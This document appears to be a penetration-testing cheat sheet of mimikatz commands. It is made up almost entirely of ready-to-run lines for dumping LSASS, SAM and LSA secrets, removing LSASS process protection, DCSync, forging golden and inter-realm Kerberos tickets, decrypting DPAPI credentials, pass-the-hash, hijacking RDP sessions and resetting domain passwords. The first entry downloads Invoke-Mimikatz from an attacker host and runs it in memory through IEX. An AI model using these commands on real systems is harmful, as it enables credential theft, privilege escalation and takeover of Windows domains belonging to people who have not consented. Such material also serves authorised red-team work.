# mimikatz

% mimikatz, passwords
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## ps1 - load Invoke-Mimikatz
https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX ; Invoke-mimikatz
```

## onliner
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all" "lsadump::sam" "exit"
```

## disable PPL and dump passwords
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords /all" "exit"
```

## vault - Get passwords of scheduled tasks
```
mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

## dcsync - user (krbtgt/Administrator)
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /user:<user>" "exit"
```

## dcsync - all (krbtgt/Administrator)
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /all /csv" "exit"
```

## dump SAM - online
```
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

## dump SAM - extract credentials from shadow copy (1)
```
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
```

## dump LSA - online
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all"
```

## dump LSA - secret keys
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::lsa /inject /name:<username>"
```

## dump LSA - extract credentials from dump
```
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords /all" "exit"
```


## dump LSA - extract credentials from shadow copy (2)
Extract old passwords
```
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY"
```

## dump LSA - extract - on hand shadow volume copy
```
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.bkp')"
```

% mimikatz, tickets

## tickets - list
```
sekurksa::tickets
```

## tickets - extract 
```
sekurlsa::tickets /export
```

## tickets - golden   
```
kerberos::golden /user:<user|administrator> /id:<user_rid|500> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<domain_sid> /domain:<domain_fqdn> /ptt [/ticket:c:\temp\trust.kirbi]
```

## tickets - golden + ExtraSID (parent-child)  
```
kerberos::golden /export /user:<user|jubeaz> /id:<user_rid> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<src_domain_sid> /domain:<src_domain_fqdn> /sids:<dst_domain_sid>-<rid|519> /ptt [/ticket:c:\temp\trust.kirbi]
```

## tickets - golden + ExtraSID (parent-child) (dc account)
```
kerberos::golden /export /user:<dc_name>$ /id:<dc_rid> /krbtgt:<krbtgt_nthash>  /groups:516 /sid:<src_domain_sid> /domain:<src_domain_fqdn> /sids:<dst_domain_sid>-<rid|516> [/startoffset:-10 /endin:60 /renewmax:10080] /ptt [/ticket:c:\temp\trust.kirbi]
```

## tickets - (golden) Inter-Realm TGT  
```
kerberos::golden /export /user:<user> /id:<user_rid> /group:500,501,513,512,520,518 /rc4:<trust_nthash>  /sid:<src_domain_sid> /domain:<src_domain_FQDN> /sids:<dst_domain_sid>-<rid|519> /service:krbtgt /target:<dst_domain_fqdn> /ptt [/ticket:c:\temp\trust.kirbi]
```

% mimikatz, dpapi, credman


## credman - List Credentials Manager
```
sekurlsa::Credman
```

## dpapi - check the file to get guidMasterKey
Seatbelt come in handy for enumerating credential blob files' location
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile>
```

## dpapi - find master key
```
$ mimikatz !sekurlsa::dpapi
```

## dpapi - use master key
sid : origin domain sid : Get-DomainSID -Domain domainname
sid : origin domain sid : Get-DomainSID -Domain domainname
```
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile> /masterkey:<masterkey>
```

## dpapi - Extract masterkey Administrator
```
mimikatz sekurlsa::dpapi
```


## dpapi - Extract masterkey with password
```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /sid:<SID> /password:<password> /protected
```

## dpapi - Extract masterkey AD
```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /rpc
```


% mimikatz, ad


## forest extra SID
sid : origin domain sid : Get-DomainSID -Domain domainname
sids :  ExtraSid value (Enterprise Admins SID) : parent SID	
```powershell
kerberos::golden /user:<user> /domain:<child_fqdn> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
```

% mimikatz, pth

## pth run powershell remotelly
#plateform/windows  #target/local  #cat/ATTACK/PTH 
Followed by : Enter-PSSession -Computer {<}computer_name}
```
sekurlsa::pth /user:<user> /domain:<domain_fqdn> /ntlm:<ntlm_hash> /run:powershell
```

## pth to RDP
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/PTH
```
sekurlsa::pth /user:<user> /domain:<domain_fqdn> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
```

% mimikatz, rdp

## RDP - Extract RDP passwords
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
```
ts::logonpasswords
```

## RDP - List RDP sessions 
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON
```
ts::sessions
```

## RDP - Hijack RDP session 
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/HIJACK
```
ts::remote /id:<id>
```

% mimikatz, user

## change user password - Reset Domain
#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
```
lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<dc_name>
```

## change user password - Reset Local
#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
```
lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<target_name>
```